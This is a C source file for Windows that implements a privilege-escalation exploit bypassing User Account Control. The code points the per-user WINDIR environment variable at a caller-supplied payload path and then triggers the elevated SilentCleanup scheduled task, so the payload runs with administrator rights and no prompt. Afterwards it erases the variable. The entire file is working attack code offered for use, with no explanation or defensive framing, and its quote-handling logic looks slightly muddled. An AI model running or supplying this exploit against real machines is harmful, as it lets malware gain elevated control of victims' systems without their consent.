#define COBJMACROS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <taskschd.h>
#include <oleauto.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")
#pragma comment(lib, "Taskschd.lib")

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI *PRtlGetVersion)(PRTL_OSVERSIONINFOW);

static BOOL SetUserWindirEnv(_In_opt_ LPCWSTR value)
{
    HKEY hKey = NULL;
    LONG r;

    r = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
    if (r != ERROR_SUCCESS)
        return FALSE;

    if (value) {
        r = RegSetValueExW(
            hKey,
            L"WINDIR",
            0,
            REG_SZ,
            (const BYTE *)value,
            (DWORD)((wcslen(value) + 1) * sizeof(WCHAR)));
    } else {
        r = RegDeleteValueW(hKey, L"WINDIR");
        if (r == ERROR_FILE_NOT_FOUND) r = ERROR_SUCCESS;
    }

    RegCloseKey(hKey);

    if (r == ERROR_SUCCESS) {
        SendMessageTimeoutW(
            HWND_BROADCAST,
            WM_SETTINGCHANGE,
            0,
            (LPARAM)L"Environment",
            SMTO_ABORTIFHUNG,
            50, 
            NULL);
        return TRUE;
    }

    return FALSE;
}


static BOOL StartSilentCleanupTask(void)
{
    HRESULT hrInit, hr = E_FAIL;
    ITaskService    *pService     = NULL;
    ITaskFolder     *pFolder      = NULL;
    IRegisteredTask *pTask        = NULL;
    IRunningTask    *pRunningTask = NULL;
    VARIANT empty;
    BSTR bFolder = NULL;
    BSTR bName   = NULL;

    hrInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    VariantInit(&empty);
    empty.vt = VT_NULL;

    do {
        bFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        bName   = SysAllocString(L"SilentCleanup");
        if (!bFolder || !bName) break;

        hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void **)&pService);
        if (FAILED(hr)) break;

        hr = ITaskService_Connect(pService, empty, empty, empty, empty);
        if (FAILED(hr)) break;

        hr = ITaskService_GetFolder(pService, bFolder, &pFolder);
        if (FAILED(hr)) break;

        hr = ITaskFolder_GetTask(pFolder, bName, &pTask);
        if (FAILED(hr)) break;

        hr = IRegisteredTask_RunEx(pTask, empty, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
        if (FAILED(hr)) break;

    } while (0);

    if (bFolder) SysFreeString(bFolder);
    if (bName)   SysFreeString(bName);
    if (pRunningTask) IRunningTask_Release(pRunningTask);
    if (pTask)   IRegisteredTask_Release(pTask);
    if (pFolder) ITaskFolder_Release(pFolder);
    if (pService) ITaskService_Release(pService);
    if (SUCCEEDED(hrInit)) CoUninitialize();

    return SUCCEEDED(hr);
}

static BOOL Launch(_In_ LPCWSTR payloadPath)
{
    WCHAR szEnvVariable[MAX_PATH * 2];
    PWSTR psz;
    BOOL  quoteFix = FALSE;
    BOOL  ok;

    if (wcslen(payloadPath) > MAX_PATH) return FALSE;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        PRtlGetVersion pRtl = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtl) {
            RTL_OSVERSIONINFOW ver = { sizeof(ver) };
            if (pRtl(&ver) == 0) {
                if (ver.dwMajorVersion == 10 && ver.dwBuildNumber >= 19044)
                    quoteFix = TRUE;
            }
        }
    }

    ZeroMemory(szEnvVariable, sizeof(szEnvVariable));
    szEnvVariable[0] = L'"';
    psz = &szEnvVariable[quoteFix ? 1 : 0];
    wcscpy_s(psz + (quoteFix ? 0 : 0), (MAX_PATH * 2) - 2, payloadPath);
    wcscat_s(szEnvVariable, MAX_PATH * 2, L"\"");

    if (!SetUserWindirEnv(psz)) return FALSE;

    ok = StartSilentCleanupTask();
    
    Sleep(1000);
    SetUserWindirEnv(NULL); 

    return ok;
}


int APIENTRY wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nCmdShow)
{
    LPCWSTR payload = L"";
    
    if (__argc > 1) {
        payload = __wargv[1];
    }
    else if (lpCmdLine && lpCmdLine[0] != L'\0') {
        payload = lpCmdLine;
    }

    if (Launch(payload))
        return 0;

    return 1;
}
